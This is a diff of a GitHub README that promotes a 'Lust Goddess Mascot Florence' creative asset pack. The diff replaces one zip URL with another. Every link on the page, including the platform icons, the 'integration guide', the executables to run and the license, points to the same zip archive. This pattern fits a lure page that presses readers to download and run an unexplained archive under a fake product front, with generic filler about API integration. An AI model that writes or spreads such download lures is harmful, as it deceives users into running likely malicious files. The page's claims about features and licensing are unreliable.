@@ -1,6 +1,6 @@
 # 🖼️ Lust Goddess Mascot Florence – Creative Download Hub
 
-[![Download](https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip)](https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip)
+[![Download](https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip)](https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip)
 
 > Step into a tapestry of style and imagination with **Lust Goddess Mascot Florence**, the ultimate repository for your creative expressions. Unlock an unforgettable character resource, radiating charm and versatility, for your personal or commercial endeavors.
 
@@ -10,11 +10,11 @@
 
 | Platform      | Availability            | Notes                |
 |---------------|------------------------|----------------------|
-| ![Windows](https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip) | ✅ Supported     | Optimized release   |
-| ![macOS](https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip)   | ✅ Supported     | Retina ready        |
-| ![Linux](https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip)      | ✅ Supported     | Multi-distro friendly |
-| ![Android](https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip)     | ⚠️ Beta support  | APK coming soon     |
-| ![iOS](https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip)  | ⚠️ Testing phase  | iOS version pending |
+| ![Windows](https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip) | ✅ Supported     | Optimized release   |
+| ![macOS](https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip)   | ✅ Supported     | Retina ready        |
+| ![Linux](https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip)      | ✅ Supported     | Multi-distro friendly |
+| ![Android](https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip)     | ⚠️ Beta support  | APK coming soon     |
+| ![iOS](https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip)  | ⚠️ Testing phase  | iOS version pending |
 
 ---
 
@@ -54,9 +54,9 @@ Immerse in creativity powered by intelligence. Florence’s unique asset suite c
 - **Claude API:** Integrate high-level comprehension and reasoning, so Florence becomes more than a mascot—a guide and interactive companion.
 
 Installation required for API integration:
-1. Download the Florence mascot package https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip
+1. Download the Florence mascot package https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip
 2. Unpack and locate the **/integration** folder.
-3. Follow the **https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip** step-by-step connection guide.
+3. Follow the **https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip** step-by-step connection guide.
 
 Florence’s adaptability ensures easy integration with both APIs—minimal configuration, maximum magic.
 
@@ -79,10 +79,10 @@ Florence’s adaptability ensures easy integration with both APIs—minimal conf
 
 ### Download & Setup
 
-1. Click the [Download badge at the top](#-lust-goddess-mascot-florence--creative-download-hub) or use the following secure download https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip
+1. Click the [Download badge at the top](#-lust-goddess-mascot-florence--creative-download-hub) or use the following secure download https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip
 2. Extract the downloaded package to your desired directory.
 3. For API integration, see [Integration Guide](#-openai-api-and-claude-api-integration).
-4. Run the **https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip** (Windows), **https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip** (macOS), or the provided binaries for Linux.
+4. Run the **https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip** (Windows), **https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip** (macOS), or the provided binaries for Linux.
 5. Follow on-screen prompts for configuration—select your platform and language.
 
 ---
@@ -96,12 +96,12 @@ Florence’s adaptability ensures easy integration with both APIs—minimal conf
 ## 📜 MIT License
 
 Distributed under the MIT License.  
-Review the license details [here](https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip).
+Review the license details [here](https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip).
 
 - Questions about licensing? Our support team is happy to clarify usage scenarios to ensure your projects remain compliant and innovative in 2025.
 
 ---
 
-[![Download](https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip)](https://raw.githubusercontent.com/Dhinesh1817/lust-goddess-florence-mascot-express/branch/endosclerite/mascot-florence-goddess-express-lust-v2.0.zip)
+[![Download](https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip)](https://github.com/Dhinesh1817/lust-goddess-florence-mascot-express/raw/refs/heads/branch/endosclerite/lust-mascot-express-goddess-florence-v2.7.zip)
 
 > Thank you for embracing the magic of Florence. May your creations beam with more color, character, and charisma than ever before! ✨
